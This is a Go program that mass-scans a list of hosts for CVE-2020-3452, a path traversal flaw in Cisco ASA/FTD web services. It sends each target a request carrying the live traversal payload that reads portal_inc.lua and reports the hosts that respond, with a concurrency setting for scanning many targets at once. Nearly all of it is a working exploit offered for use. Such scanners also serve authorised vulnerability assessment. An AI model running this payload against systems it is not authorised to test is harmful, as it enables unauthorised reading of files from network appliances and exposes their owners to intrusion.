package main

import (
	"bufio"
	"flag"
	"fmt"
	"github.com/s1xg0d/gahttp"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

func printBody(req *http.Request, resp *http.Response, err error) {
	if err != nil {
		return
	}
	b, _ := ioutil.ReadAll(resp.Body)
	bs := string(b)
	if err != nil {
		return
	}
	if strings.Contains(bs, "INTERNAL_PASSWORD_ENABLED") || strings.Contains(bs, "CONF_VIRTUAL_KEYBOARD") {
		fmt.Printf("%s find cve-2020-3452\n", req.Host)
	}
}

func main() {
	var urls []string
	flag.Parse()
	urlfile := flag.Arg(0)
	concurrency := flag.Arg(1)
	if urlfile == "" {
		fmt.Fprintln(os.Stderr, `
./cve-2020-3452 urlfile concurrency
exp :
	./cve-2020-3452 url.txt 40
`)
		return
	}
	file, err := os.Open(urlfile)
	if err != nil {
		return
	}
	defer file.Close()
	bu := bufio.NewReader(file)
	for {
		s, _, c := bu.ReadLine()
		if c == io.EOF {
			break
		}
		str := string(s)
		urls = append(urls, str)

	}
	p := gahttp.NewPipelineWithClient(gahttp.NewClient(gahttp.SkipVerify))
	int, _ := strconv.Atoi(concurrency)
	p.SetConcurrency(int)
	p.SetRateLimit(time.Second * 1)
	for _, u := range urls {
		if !strings.HasPrefix(u, "https://") {
			p.Get("https://"+u+"/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../", gahttp.Wrap(printBody, gahttp.CloseBody))
		} else {
			p.Get(u+"/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../", gahttp.Wrap(printBody, gahttp.CloseBody))
		}
	}
	p.Done()
	p.Wait()
}
